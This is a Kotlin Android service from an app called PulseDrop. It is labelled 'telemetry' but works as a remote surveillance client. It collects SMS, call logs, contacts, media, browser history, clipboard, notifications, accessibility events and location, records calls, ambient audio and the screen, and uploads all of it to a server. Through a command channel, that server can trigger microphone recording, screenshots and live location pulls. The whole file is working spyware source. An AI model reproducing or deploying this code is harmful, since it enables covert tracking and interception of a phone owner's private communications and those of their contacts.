package com.pulsedrop.telemetry

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.*
import android.util.Log
import androidx.core.app.NotificationCompat
import com.pulsedrop.telemetry.collectors.*
import com.pulsedrop.telemetry.data.*
import com.pulsedrop.telemetry.network.NetworkClient
import com.pulsedrop.telemetry.services.*
import com.pulsedrop.telemetry.utils.PrefsManager
import kotlinx.coroutines.*

class TelemetryService : Service() {

    companion object {
        const val CHANNEL_ID = "PULSEDROP_SERVICE"
        const val NOTIFICATION_ID = 1001
        const val ACTION_STOP = "com.pulsedrop.STOP"
        const val ACTION_GEOFENCE = "GEOFENCE_EVENT"
        const val ACTION_CALL_RECORDING = "CALL_RECORDING_COMPLETE"
        const val ACTION_SCREEN_RECORD_RESULT = "SCREEN_RECORD_RESULT"
        const val ACTION_SCREENSHOT_RESULT = "SCREENSHOT_RESULT"

        var isRunning = false
    }

    private lateinit var prefs: PrefsManager
    private lateinit var networkClient: NetworkClient
    private lateinit var uploadQueue: UploadQueue

    // Collectors
    private var locationCollector: LocationCollector? = null
    private var smsCollector: SmsCollector? = null
    private var callLogCollector: CallLogCollector? = null
    private var contactCollector: ContactCollector? = null
    private var mediaCollector: MediaCollector? = null
    private var deviceInfoCollector: DeviceInfoCollector? = null
    private var browserCollector: BrowserHistoryCollector? = null
    private var appListCollector: AppListCollector? = null
    private var clipboardCollector: ClipboardCollector? = null

    // Services
    private var callRecorder: CallRecorder? = null
    private var screenRecorder: ScreenRecorder? = null
    private var ambientRecorder: AmbientRecorder? = null
    private var screenshotCapturer: ScreenshotCapturer? = null
    private var callStateReceiver: CallStateReceiver? = null
    private var packageReceiver: AppListCollector.PackageReceiver? = null

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val handler = Handler(Looper.getMainLooper())
    private var periodicJob: Job? = null
    private var heartbeatJob: Job? = null

    // Pending screen record intent
    private var pendingScreenRecordResultCode: Int = 0
    private var pendingScreenRecordData: Intent? = null
    private var pendingScreenshotResultCode: Int = 0
    private var pendingScreenshotData: Intent? = null

    override fun onCreate() {
        super.onCreate()
        prefs = PrefsManager(this)
        prefs.ensureDeviceId()

        networkClient = NetworkClient(prefs.serverUrl, prefs.deviceId, prefs.authToken)
        uploadQueue = UploadQueue(AppDatabase.getInstance(this).pendingUploadDao())

        initCollectors()
        initServices()
        setupNetworkCallbacks()
        createNotificationChannel()
    }

    private fun initCollectors() {
        val onData: (UploadEnvelope) -> Unit = { envelope ->
            networkClient.uploadData(envelope) { success ->
                if (!success) {
                    scope.launch { uploadQueue.enqueue(envelope.type, envelope.data) }
                }
            }
        }

        locationCollector = LocationCollector(this, onData)
        smsCollector = SmsCollector(this, onData)
        callLogCollector = CallLogCollector(this, onData)
        contactCollector = ContactCollector(this, onData)
        mediaCollector = MediaCollector(this, onData)
        deviceInfoCollector = DeviceInfoCollector(this, onData)
        browserCollector = BrowserHistoryCollector(this, onData)
        appListCollector = AppListCollector(this, onData)
        clipboardCollector = ClipboardCollector(this, onData)
    }

    private fun initServices() {
        callRecorder = CallRecorder(this)
        screenRecorder = ScreenRecorder(this)
        ambientRecorder = AmbientRecorder(this)
        screenshotCapturer = ScreenshotCapturer(this)

        // Wire notification listener
        NotificationListener.onNotification = { envelope ->
            networkClient.uploadData(envelope) { success ->
                if (!success) scope.launch { uploadQueue.enqueue(envelope.type, envelope.data) }
            }
        }

        // Wire accessibility
        AccessibilityMonitor.onEvent = { envelope ->
            networkClient.uploadData(envelope) { success ->
                if (!success) scope.launch { uploadQueue.enqueue(envelope.type, envelope.data) }
            }
        }

        // Call state receiver
        callStateReceiver = CallStateReceiver()
        CallStateReceiver.callRecorder = callRecorder
        val callFilter = IntentFilter("android.intent.action.PHONE_STATE")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(callStateReceiver, callFilter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(callStateReceiver, callFilter)
        }

        // Package receiver
        packageReceiver = appListCollector!!.PackageReceiver()
        val pkgFilter = appListCollector!!.createFilter()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(packageReceiver, pkgFilter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(packageReceiver, pkgFilter)
        }
    }

    private fun setupNetworkCallbacks() {
        networkClient.onCommand = { cmd -> handleCommand(cmd) }
        networkClient.onConnected = {
            isRunning = true
            scope.launch { flushQueue() }
        }
        networkClient.onDisconnected = { isRunning = false }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_STOP -> {
                stopSelf()
                return START_NOT_STICKY
            }
            ACTION_GEOFENCE -> {
                handleGeofenceEvent(intent)
            }
            ACTION_CALL_RECORDING -> {
                handleCallRecordingComplete(intent)
            }
            ACTION_SCREEN_RECORD_RESULT -> {
                pendingScreenRecordResultCode = intent.getIntExtra("resultCode", 0)
                pendingScreenRecordData = intent.getParcelableExtra("data")
                startScreenRecordingInternal()
            }
            ACTION_SCREENSHOT_RESULT -> {
                pendingScreenshotResultCode = intent.getIntExtra("resultCode", 0)
                pendingScreenshotData = intent.getParcelableExtra("data")
                takeScreenshotInternal()
            }
        }

        startForeground(NOTIFICATION_ID, buildNotification())
        prefs.isServiceRunning = true
        isRunning = true

        // Connect WebSocket
        networkClient.connectWebSocket()

        // Start collection based on toggles
        applyFeatureToggles()

        // Periodic collection
        startPeriodicCollection()

        // Heartbeat
        startHeartbeat()

        return START_STICKY
    }

    private fun buildNotification(): Notification {
        val stopIntent = Intent(this, TelemetryService::class.java).apply { action = ACTION_STOP }
        val stopPi = PendingIntent.getService(
            this, 0, stopIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val mainIntent = Intent(this, MainActivity::class.java)
        val mainPi = PendingIntent.getActivity(
            this, 0, mainIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("PulseDrop Active")
            .setContentText("Telemetry service running — tap to open")
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .setOngoing(true)
            .setContentIntent(mainPi)
            .addAction(android.R.drawable.ic_menu_close_clear_cancel, "Stop", stopPi)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "PulseDrop Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Persistent notification for PulseDrop telemetry"
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun applyFeatureToggles() {
        val toggles = prefs.featureToggles

        if (toggles.location) locationCollector?.startLocationUpdates(30000)
        if (toggles.geofence) locationCollector?.registerGeofences(prefs.geofenceZones)
        if (toggles.clipboard) clipboardCollector?.startMonitoring()

        // One-time collectors run in periodic job
    }

    private fun startPeriodicCollection() {
        periodicJob?.cancel()
        periodicJob = scope.launch {
            while (isActive) {
                val toggles = prefs.featureToggles
                withContext(Dispatchers.Main) {
                    if (toggles.sms) smsCollector?.collectAll()
                    if (toggles.callLog) callLogCollector?.collectAll()
                    if (toggles.contacts) contactCollector?.collectAll()
                    if (toggles.deviceInfo) {
                        deviceInfoCollector?.collect()
                        deviceInfoCollector?.checkSimChange()
                    }
                    if (toggles.browserHistory) {
                        browserCollector?.collectHistory()
                        browserCollector?.collectBookmarks()
                    }
                    if (toggles.appList) appListCollector?.collectAll()
                    if (toggles.media) {
                        mediaCollector?.collectPhotos(50)
                        mediaCollector?.collectVideos(20)
                    }
                }
                delay(60000) // every 60 seconds
            }
        }
    }

    private fun startHeartbeat() {
        heartbeatJob?.cancel()
        heartbeatJob = scope.launch {
            while (isActive) {
                networkClient.sendHeartbeat()
                delay(15000)
            }
        }
    }

    private suspend fun flushQueue() {
        val batch = uploadQueue.getBatch(50)
        batch.forEach { item ->
            val envelope = UploadEnvelope(item.type, prefs.deviceId, item.timestamp, item.payloadJson)
            var success = false
            networkClient.uploadData(envelope) { success = it }
            // Simple wait for async
            delay(200)
            if (success) uploadQueue.remove(item) else uploadQueue.markRetry(item)
        }
    }

    // --- Command handling ---

    private fun handleCommand(cmd: ServerCommand) {
        Log.d("PulseDrop", "Command received: ${cmd.type}")
        when (cmd.type) {
            "pull_location" -> cmdPullLocation(cmd)
            "start_audio" -> cmdStartAudio(cmd)
            "stop_audio" -> cmdStopAudio(cmd)
            "screenshot" -> cmdScreenshot(cmd)
            "start_screen_record" -> cmdStartScreenRecord(cmd)
            "stop_screen_record" -> cmdStopScreenRecord(cmd)
            "fetch_logs" -> cmdFetchLogs(cmd)
            "update_toggles" -> cmdUpdateToggles(cmd)
            "upload_call_recording" -> cmdUploadCallRecording(cmd)
            else -> sendResponse(cmd.commandId, cmd.type, "error", error = "Unknown command")
        }
    }

    private fun cmdPullLocation(cmd: ServerCommand) {
        locationCollector?.pullCurrentLocation { loc ->
            if (loc != null) {
                sendResponse(cmd.commandId, cmd.type, "success", data = loc)
            } else {
                sendResponse(cmd.commandId, cmd.type, "error", error = "Could not get location")
            }
        }
    }

    private fun cmdStartAudio(cmd: ServerCommand) {
        val duration = (cmd.payload?.get("duration") as? Double)?.toInt() ?: 30
        val path = ambientRecorder?.startRecording()
        if (path != null) {
            sendResponse(cmd.commandId, cmd.type, "success", data = mapOf("file" to path))
            // Auto-stop after duration
            handler.postDelayed({
                ambientRecorder?.stopRecording()?.let { file ->
                    networkClient.uploadFile(file, "ambient_audio") { success, _ ->
                        Log.d("PulseDrop", "Ambient upload: $success")
                    }
                }
            }, duration * 1000L)
        } else {
            sendResponse(cmd.commandId, cmd.type, "error", error = "Failed to start recording")
        }
    }

    private fun cmdStopAudio(cmd: ServerCommand) {
        ambientRecorder?.stopRecording()?.let { file ->
            networkClient.uploadFile(file, "ambient_audio") { success, _ ->
                sendResponse(cmd.commandId, cmd.type, if (success) "success" else "error",
                    data = mapOf("file" to file.name, "uploaded" to success))
            }
        } ?: sendResponse(cmd.commandId, cmd.type, "error", error = "No active recording")
    }

    private fun cmdScreenshot(cmd: ServerCommand) {
        // Need MediaProjection permission - request via activity
        val intent = Intent(this, MediaProjectionActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            putExtra("action", "screenshot")
            putExtra("command_id", cmd.commandId)
        }
        startActivity(intent)
        sendResponse(cmd.commandId, cmd.type, "pending", data = mapOf("message" to "Requesting screen capture permission"))
    }

    private fun cmdStartScreenRecord(cmd: ServerCommand) {
        val intent = Intent(this, MediaProjectionActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            putExtra("action", "screen_record")
            putExtra("command_id", cmd.commandId)
        }
        startActivity(intent)
        sendResponse(cmd.commandId, cmd.type, "pending", data = mapOf("message" to "Requesting screen recording permission"))
    }

    private fun cmdStopScreenRecord(cmd: ServerCommand) {
        screenRecorder?.stopRecording()?.let { file ->
            networkClient.uploadFile(file, "screen_recording") { success, _ ->
                sendResponse(cmd.commandId, cmd.type, if (success) "success" else "error",
                    data = mapOf("file" to file.name, "uploaded" to success))
            }
        } ?: sendResponse(cmd.commandId, cmd.type, "error", error = "No active screen recording")
    }

    private fun cmdFetchLogs(cmd: ServerCommand) {
        // Collect a snapshot of all data
        scope.launch {
            val toggles = prefs.featureToggles
            withContext(Dispatchers.Main) {
                if (toggles.sms) smsCollector?.collectAll()
                if (toggles.callLog) callLogCollector?.collectAll()
                if (toggles.contacts) contactCollector?.collectAll()
                if (toggles.deviceInfo) deviceInfoCollector?.collect()
                if (toggles.appList) appListCollector?.collectAll()
            }
            sendResponse(cmd.commandId, cmd.type, "success", data = mapOf("message" to "Logs collected and uploaded"))
        }
    }

    private fun cmdUpdateToggles(cmd: ServerCommand) {
        val payload = cmd.payload ?: return
        val current = prefs.featureToggles
        val updated = FeatureToggles(
            location = payload["location"] as? Boolean ?: current.location,
            geofence = payload["geofence"] as? Boolean ?: current.geofence,
            sms = payload["sms"] as? Boolean ?: current.sms,
            callLog = payload["call_log"] as? Boolean ?: current.callLog,
            callRecording = payload["call_recording"] as? Boolean ?: current.callRecording,
            contacts = payload["contacts"] as? Boolean ?: current.contacts,
            media = payload["media"] as? Boolean ?: current.media,
            microphone = payload["microphone"] as? Boolean ?: current.microphone,
            deviceInfo = payload["device_info"] as? Boolean ?: current.deviceInfo,
            browserHistory = payload["browser_history"] as? Boolean ?: current.browserHistory,
            appList = payload["app_list"] as? Boolean ?: current.appList,
            clipboard = payload["clipboard"] as? Boolean ?: current.clipboard,
            notifications = payload["notifications"] as? Boolean ?: current.notifications,
            accessibility = payload["accessibility"] as? Boolean ?: current.accessibility,
            screenRecording = payload["screen_recording"] as? Boolean ?: current.screenRecording
        )
        prefs.featureToggles = updated
        applyFeatureToggles()
        sendResponse(cmd.commandId, cmd.type, "success", data = updated)
    }

    private fun cmdUploadCallRecording(cmd: ServerCommand) {
        val fileName = cmd.payload?.get("file_name") as? String ?: return
        val file = java.io.File(callRecorder?.getRecordingDir(), fileName)
        if (file.exists()) {
            networkClient.uploadFile(file, "call_recording") { success, _ ->
                sendResponse(cmd.commandId, cmd.type, if (success) "success" else "error",
                    data = mapOf("file" to fileName, "uploaded" to success))
            }
        } else {
            sendResponse(cmd.commandId, cmd.type, "error", error = "File not found: $fileName")
        }
    }

    private fun sendResponse(commandId: String, type: String, status: String, data: Any? = null, error: String? = null) {
        val response = CommandResponse(
            commandId = commandId,
            type = type,
            status = status,
            data = data,
            error = error,
            timestamp = System.currentTimeMillis()
        )
        networkClient.sendCommandResponse(response)
    }

    // --- Internal event handlers ---

    private fun handleGeofenceEvent(intent: Intent) {
        val bundle = intent.getBundleExtra("event") ?: return
        val event = GeofenceEvent(
            geofenceId = bundle.getString("id") ?: "",
            transition = bundle.getString("transition") ?: "",
            lat = bundle.getDouble("lat"),
            lon = bundle.getDouble("lon"),
            timestamp = bundle.getLong("timestamp")
        )
        locationCollector?.emitGeofenceEvent(event)
    }

    private fun handleCallRecordingComplete(intent: Intent) {
        val filePath = intent.getStringExtra("file_path") ?: return
        val phoneNumber = intent.getStringExtra("phone_number") ?: "unknown"
        val file = java.io.File(filePath)
        if (file.exists()) {
            networkClient.uploadFile(file, "call_recording") { success, _ ->
                Log.d("PulseDrop", "Call recording uploaded: $success")
            }
        }
    }

    private fun startScreenRecordingInternal() {
        val data = pendingScreenRecordData ?: return
        val path = screenRecorder?.startRecording(pendingScreenRecordResultCode, data)
        if (path != null) {
            Log.d("PulseDrop", "Screen recording started: $path")
        }
        pendingScreenRecordData = null
    }

    private fun takeScreenshotInternal() {
        val data = pendingScreenshotData ?: return
        screenshotCapturer?.capture(pendingScreenshotResultCode, data) { file ->
            file?.let {
                networkClient.uploadFile(it, "screenshot") { success, _ ->
                    Log.d("PulseDrop", "Screenshot uploaded: $success")
                }
            }
        }
        pendingScreenshotData = null
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        prefs.isServiceRunning = false

        periodicJob?.cancel()
        heartbeatJob?.cancel()
        scope.cancel()

        locationCollector?.stopLocationUpdates()
        locationCollector?.removeGeofences()
        clipboardCollector?.stopMonitoring()
        callRecorder?.stopRecording()
        screenRecorder?.stopRecording()
        ambientRecorder?.stopRecording()

        try { callStateReceiver?.let { unregisterReceiver(it) } } catch (e: Exception) {}
        try { packageReceiver?.let { unregisterReceiver(it) } } catch (e: Exception) {}

        networkClient.disconnect()
    }
}
